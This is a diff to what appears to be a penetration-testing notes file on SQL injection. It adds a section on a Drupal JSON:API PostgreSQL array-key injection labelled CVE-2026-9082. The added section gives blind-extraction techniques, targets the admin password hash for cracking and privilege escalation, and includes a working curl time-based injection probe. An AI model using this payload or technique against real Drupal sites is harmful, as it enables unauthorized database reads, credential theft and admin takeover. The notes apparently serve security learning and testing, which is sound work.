@@ -4,8 +4,8 @@ type: technique
 tags: [auth-bypass, database, exploitation, injection, sqli, waf-bypass, web]
 phase: exploitation
 date_created: 2026-05-12
-date_updated: 2026-06-29
-sources: [cpts-sqli-fundamentals, ps-labs-sqli, thm-adv-sqli-advanced, thm-linux-sql, thm-web-sql-fundamentals, h1-scraped-sqli, thm-adv-orm, payloadsallthethings-sqli, git-payloadsallthethings, git-portswigger-all-labs]
+date_updated: 2026-07-14
+sources: [cpts-sqli-fundamentals, ps-labs-sqli, thm-adv-sqli-advanced, thm-linux-sql, thm-web-sql-fundamentals, h1-scraped-sqli, thm-adv-orm, payloadsallthethings-sqli, git-payloadsallthethings, git-portswigger-all-labs, cve-2026-9082-drupal]
 ---
 
 ## What it is
@@ -1009,6 +1009,35 @@ Steps:
 Login as administrator to solve.
 
 ---
+
+## Drupal JSON:API PostgreSQL array-key injection (CVE-2026-9082)
+
+A real-world PDO-placeholder-break pattern worth knowing beyond Drupal. Drupal's DB layer
+parameterizes condition values, but the PostgreSQL-specific `Condition::translateCondition()`
+derives its PDO placeholder name from the value's array KEY and concatenates it unsanitized.
+JSON:API (default-enabled, anonymous) forwards arbitrary filter keys into the query builder.
+Because PostgreSQL PDO emulated prepares only accept `[a-zA-Z0-9_]` in a `:placeholder`, a key
+containing `)` terminates the placeholder and spills the rest of the key into the query as raw SQL.
+
+Reusable technique details:
+- The `--` comment terminator does NOT work (emulated prepares tokenize placeholders through
+  comments). Instead balance parentheses explicitly and re-open a trailing group so the
+  legitimate placeholder stays valid; replace spaces with `/**/`.
+- Blind only: boolean (`OR TRUE` vs `OR FALSE` row-count diff) or time-based
+  (`CASE WHEN <cond> THEN pg_sleep(5) ELSE pg_sleep(0) END`), then char-by-char via
+  `ASCII(SUBSTR((<subquery>),pos,1)) > mid` binary search.
+- High-value reads: `SELECT version()`, `current_user`, and `name`/`mail`/`pass` from
+  `users_field_data WHERE uid=1` (admin hash -> offline crack -> privesc).
+
+```bash
+# time-based probe through JSON:API (the array KEY carries the injection; URL-encode in practice)
+curl -g -s -o /dev/null -w "time=%{time_total}s\n" \
+  "https://TARGET/jsonapi/node/article?filter[s][condition][path]=title&filter[s][condition][operator]=IN&filter[s][condition][value][0]=a&filter[s][condition][value][1))/**/OR/**/(SELECT/**/pg_sleep(5))/**/IS/**/NOT/**/NULL/**/OR/**/((1=1]=c"
+```
+
+Affected Drupal Core 8.0-11.3.9 (PostgreSQL backend only; not MySQL/MariaDB); fixed 11.3.10 /
+11.2.12 / 10.6.9 / 10.5.10 (SA-CORE-2026-004). Single-source (fork PoC); verify against the
+drupal.org advisory before relying.
 
 ## App-side keyword blacklist (custom PHP "WAF") + login redirect oracle
 
